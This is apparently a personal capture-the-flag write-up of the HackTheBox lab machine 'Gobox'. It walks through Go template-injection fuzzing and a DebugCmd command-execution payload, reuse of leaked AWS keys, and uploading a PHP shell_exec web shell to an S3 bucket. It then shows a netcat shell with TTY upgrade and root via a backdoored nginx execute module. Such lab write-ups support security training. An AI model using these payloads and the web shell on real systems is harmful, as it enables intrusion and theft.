### write ups
* https://0xdf.gitlab.io/2021/08/30/htb-gobox.html#shell-as-root
* https://fahmifj.github.io/hackthebox/gobox/

### Two special FUZZ for SSTI
```bash
wfuzz -u http://$IP:8080/forgot/ -w /usr/share/seclists/Fuzzing/special-chars.txt -d email=FUZZFUZZ --hw 97
```

```bash
Target: http://10.129.95.236:8080/forgot/
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                          
=====================================================================

000000027:   200        50 L     96 W       1497 Ch     "; - ;"                                                                                                                          
000000014:   200        50 L     96 W       1499 Ch     "+ - +"                                                                                                                          
000000016:   502        7 L      11 W       150 Ch      "{ - {"                                                                                                                          
000000006:   200        50 L     96 W       1497 Ch     "% - %"                                                                                                                          
000000008:   200        50 L     96 W       1497 Ch     "& - &"  
```

### SSTI 
* https://www.onsecurity.io/blog/go-ssti-method-research/
* https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#ssti-in-go
* https://www.calhoun.io/intro-to-templates-p3-functions/

### Login with the web creds
Got the source code and call a method through a template injection. As long as the method is an attribute of te value passed to the template. 

Therefore, even specify explicit parameters, similar to how to perform a deserialization attack.

Find a gadget and php deserialization or any deserialization.

### Found aws creds instead of reverse shell as the firewall ruled out
```txt
aws_access_key_id=SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
aws_secret_access_key=SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
```

aws --profile default configure set aws_access_key_id 'SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz'
aws --profile default configure set aws_secret_access_key "SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz"
aws --profile default configure set region 'us-east-1'

### AWS Enum works find on both attack and victim machines
```bash
❯ aws --endpoint-url=http://$IP:4566 s3 ls
2023-01-12 17:10:53 website
```

```js burp
email={{ .DebugCmd "aws s3 ls" }}
```

### Get shell just like Bucket.pdf
```bash
echo '<?php echo shell_exec($_REQUEST["cmd"]); ?>' > a.php

aws --endpoint-url=http://$IP:4566 s3 cp a.php s3://website/

❯ curl http://10.129.95.236/a.php\?cmd\=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
$ cat user.txt
3a790c96cde75fc6d3ed518cff8f95fa
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@gobox:/home/ubuntu$ ^Z
[1]  + 54542 suspended  nc -lvnp 80
❯ stty raw -echo; fg
[1]  + 54542 continued  nc -lvnp 80
                                   id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@gobox:/home/ubuntu$
```

adjust tty size
```
❯ tput cols
124
                                                                                                                            
❯ tput lines
56

stty rows 56 columns 124
```

### Enum
```bash
www-data@gobox:~$ ss -lnpt
State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process  
LISTEN   0        511            127.0.0.1:8000          0.0.0.0:*              
LISTEN   0        4096             0.0.0.0:9000          0.0.0.0:*              
LISTEN   0        4096             0.0.0.0:9001          0.0.0.0:*              
LISTEN   0        511              0.0.0.0:8080          0.0.0.0:*              
LISTEN   0        511              0.0.0.0:80            0.0.0.0:*              
LISTEN   0        4096       127.0.0.53%lo:53            0.0.0.0:*              
LISTEN   0        511              0.0.0.0:4566          0.0.0.0:*              
LISTEN   0        128              0.0.0.0:22            0.0.0.0:*              
LISTEN   0        4096                [::]:9000             [::]:*              
LISTEN   0        4096                [::]:9001             [::]:*              
LISTEN   0        128                 [::]:22               [::]:* 

ps -ef

root         956       1  0 Jan12 ?        00:00:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;

/usr/bin/docker-proxy

root        1173     968  0 Jan12 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 9000 -container-ip 172.28.0.2 -container-port 4566
root        1180     968  0 Jan12 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 9000 -container-ip 172.28.0.2 -container-port 4566
root        1193     968  0 Jan12 ?        00:00:59 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 9001 -container-ip 172.28.0.3 -container-port 80
root        1199     968  0 Jan12 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 9001 -container-ip 172.28.0.3 -container-port 80
```

Running `ss -lnpt` reveals many ports are listening on the box, specifically 127.0.0.1:8000
sticks out because it is the only port listening on localhost.
Making a web request to that port reveals that it is an HTTP Server and running `ps -ef` shows
that nginx is running not apache. The NGINX Configuration has a weird option (Command: on)
that is not used in any nginx documentation.

```bash
www-data@gobox:/etc/nginx$ ls
conf.d        fastcgi_params  koi-win     modules-available  nginx.conf    scgi_params      sites-enabled  uwsgi_params
fastcgi.conf  koi-utf         mime.types  modules-enabled    proxy_params  sites-available  snippets       win-utf
www-data@gobox:/etc/nginx$ cd sites-enabled/
www-data@gobox:/etc/nginx/sites-enabled$ ls
default
www-data@gobox:/etc/nginx/sites-enabled$ cat default

server {
        listen 127.0.0.1:8000;
        location / {
                command on;
        }
}
```

When I try to interact with it, it returns nothing.
```bash
www-data@gobox:/opt$ curl -s http://127.0.0.1:8000
www-data@gobox:/opt$ curl -I http://127.0.0.1:8000
curl: (52) Empty reply from server
```

Searching Google for "Command: On" Nginx
Github should bring up the NginxExecute module (https://github.com/A1vinSmith/NginxExecute).
Additionally, looking into /usr/share/nginx/modules/ reveals the name of the module.

Therefore, let's go and check the `modules-enabled`

```bash
www-data@gobox:/etc/nginx/modules-enabled$ cat 50-backdoor.conf 
load_module modules/ngx_http_execute_module.so;
www-data@gobox:/etc/nginx/modules-enabled$ find / -type f -name "ngx_http_execute_module.so" 2>/dev/null
/usr/lib/nginx/modules/ngx_http_execute_module.so
```

Above GitHub page states that curl -g "http://192.168.18.22/?system.run[command]" can be
used to execute commands. However, when attempting to do it with our IP/Port, it does not
work. Running strings against the nginx module and grepping for "run", reveals the name was
changed from system to ippsec and updating our command will allow for escalation to root.

` -g, --globoff       Disable URL sequences and ranges using {} and []`

```bash
www-data@gobox:/etc/nginx/modules-enabled$ curl -s -g "http://127.0.0.1:8000/?ippsec.run[cat /root/root.txt]"
613a8ad3c12be9a12f90c550ac388cbb
www-data@gobox:/etc/nginx/modules-enabled$ strings /usr/lib/nginx/modules/ngx_http_execute_module.so | grep run
```